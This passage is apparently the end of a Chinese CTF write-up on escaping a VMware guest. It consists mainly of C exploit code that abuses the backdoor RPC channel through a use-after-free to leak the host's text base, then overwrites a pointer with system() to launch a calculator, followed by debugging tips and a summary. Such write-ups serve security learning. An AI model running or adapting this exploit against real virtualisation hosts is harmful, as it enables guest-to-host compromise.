            return;
        }
        channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd)+0x10,cmd,&res);
        channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&len,&res);
        if(!res){
            printf("fail to recv data len\n");
            return;
        }
        printf("recv len:%d\n",len);
        data = malloc(len+0x10);
        memset(data,0,len+0x10);
        for(i=0;i<len+0x10;i+=4){
            channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&res);
        }
        printf("recv data:%s\n",data);
        channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&res);
        if(!res){
            printf("fail to recv finish\n");
        }
        channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&res);
        if(!res){
            printf("fail to close channel\n");
            return;
        }
    }
    void leak(){
        struct channel chan[10];
        int res=0;
        int len,i;    
        char pay[8192];
        char *s1 = "info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        char *data;
        char *s2 = "info-get guestinfo.a";
        char *s21= "info-get guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        char *s3 = "1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        char *s4 = "tools.capability.dnd_version 4";
        char *s5 = "vmx.capability.dnd_version";
        //init data
        run_cmd(s1); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);
        run_cmd(s4);
        //first step 
        channel_open(&chan[0].cookie1,&chan[0].cookie2,&chan[0].num,&res);
        if(!res){
            printf("fail to open channel!\n");
            return;
        }
        channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s21),&res);//strlen(s21) = 0x100
        if(!res){
            printf("fail to set len\n");
            return;
        }
        channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s21),s2,&res);
        channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&len,&res);
        if(!res){
            printf("fail to recv data len\n");
            return;
        }
        printf("recv len:%d\n",len);
        data = malloc(len+0x10);
        memset(data,0,len+0x10);
        for(i=0;i<len+0x10;i++){
            channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&res);
        }
        printf("recv data:%s\n",data);
        //second step free the reply and let the other channel get it.
        channel_open(&chan[1].cookie1,&chan[1].cookie2,&chan[1].num,&res);
        if(!res){
            printf("fail to open channel!\n");
            return;
        }
        channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2),&res);
        if(!res){
            printf("fail to set len\n");
            return;
        }
        channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2)-4,s2,&res);
        if(!res){
            printf("fail to send data\n");
            return;
        }
        //free the output buffer
        printf("Freeing the buffer....,bp:0x5555556DD3EF\n");
        getchar();
        channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&res);
        if(!res){
            printf("fail to recv finish1\n");
            return;
        }
        //finished sending the command, should get the freed buffer
        printf("Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n");
        channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,4,&s2[16],&res);
        if(!res){
            printf("fail to send data\n");
            return;
        }
        //third step,free it again
        //set status to be 4
        //free the output buffer
        printf("Free the buffer again...\n");
        getchar();
        channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&res);
        if(!res){
            printf("fail to recv finish2\n");
            return;
        }
        printf("Trying to reuse the buffer as a struct, which we can leak..\n");
        getchar();
        run_cmd(s5);
        printf("Should be done.Check the buffer\n");
        getchar();
        //Now the output buffer of chan[1] is used as a struct, which contains many addresses
        channel_recv_reply_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,&len,&res);
        if(!res){
            printf("fail to recv data len\n");
            return;
        }
        data = malloc(len+0x10);
        memset(data,0,len+0x10);
        for(i=0;i<len+0x10;i+=4){
            channel_recv_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,i,data,&res);
        }
        printf("recv data:\n");
        for(i=0;i<len;i+=8){
            printf("recv data:%lx\n",*(long long *)&data[i]);
        }
        text = (*(uint64_t *)data)-0xf818d0;
        channel_recv_finish(chan[0].cookie1,chan[0].cookie2,chan[0].num,&res);
        printf("Leak Success\n");
    }
    void exploit(){
        //the exploit step is almost the same as the leak ones
        struct channel chan[10];
        int res=0;
        int len,i;
        char *data;
        char *s1 = "info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
        char *s2 = "info-get guestinfo.b";
        char *s3 = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
        char *s4 = "gnome-calculator\x00";
        uint64_t pay1 =text+0xFE95B8; 
        uint64_t pay2 =text+0xECFE0; //system
        uint64_t pay3 =text+0xFE95C8;
        char *pay4 = "gnome-calculator\x00";
        //run_cmd(s1);
        channel_open(&chan[0].cookie1,&chan[0].cookie2,&chan[0].num,&res);
        if(!res){
            printf("fail to open channel!\n");
            return;
        }
        channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s1),&res);
        if(!res){
            printf("fail to set len\n");
            return;
        }
        channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s1),s1,&res);
        channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&len,&res);
        if(!res){
            printf("fail to recv data len\n");
            return;
        }
        printf("recv len:%d\n",len);
        data = malloc(len+0x10);
        memset(data,0,len+0x10);
        for(i=0;i<len+0x10;i+=4){
            channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&res);
        }
        printf("recv data:%s\n",data);
        channel_open(&chan[1].cookie1,&chan[1].cookie2,&chan[1].num,&res);
        if(!res){
            printf("fail to open channel!\n");
            return;
        }
        channel_open(&chan[2].cookie1,&chan[2].cookie2,&chan[2].num,&res);
        if(!res){
            printf("fail to open channel!\n");
            return;
        }
        channel_open(&chan[3].cookie1,&chan[3].cookie2,&chan[3].num,&res);
        if(!res){
            printf("fail to open channel!\n");
            return;
        }
        //channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&res);
        channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&res);
        if(!res){
            printf("fail to recv finish2\n");
            return;
        }
        channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s3),&res);
        if(!res){
            printf("fail to set len\n");
            return;
        }
        printf("leak2 success\n");
        /***
        channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&len,&res);
        if(!res){
            printf("fail to recv data len\n");
            return;
        }
        ***/
        //channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&res);
        channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&res);
        if(!res){
            printf("fail to recv finish2\n");
            return;
        }
        channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,8,&pay1,&res);
        channel_set_len(chan[2].cookie1,chan[2].cookie2,chan[2].num,strlen(s3),&res);
        if(!res){
            printf("fail to set len\n");
            return;
        }
        channel_set_len(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(s3),&res);
        channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&pay2,&res);
        channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&pay3,&res);
        channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(pay4)+1,pay4,&res);
        run_cmd(s4);
        if(!res){
            printf("fail to set len\n");
            return;
        }
    }
    void main(){
        setvbuf(stdout,0,2,0);
        setvbuf(stderr,0,2,0);
        setvbuf(stdin,0,2,0);
        leak();
        printf("text base :%p",text);
        getchar();
        exploit();
    }
## tips
​
在调试的时候会遇到一个问题：如果直接在被攻击机编译运行exp，运行到断点处会卡死，导致鼠标没法从虚拟机中拖出来。所以可以ssh连接到被攻击机，远程运行exp避免这个问题；或者可以在exp中加一行sleep防止卡在虚拟机里。  
​ 另外调试时最好将虚拟机最小化，防止不小心把鼠标点到虚拟主机中卡死。
## 总结
​ 第一次调试虚拟机逃逸的题目，逆向分析的过程花了很大一部分时间，最后编写EXP、调试的过程大部分工作都是仿照[Real World CTF 2018
Finals Station-Escape](https://zhuanlan.zhihu.com/p/52140921)进行，最后成功弹出计算器还是有些小激动的，也算是对利用backdoor这个攻击面的第一次尝试，收获很多。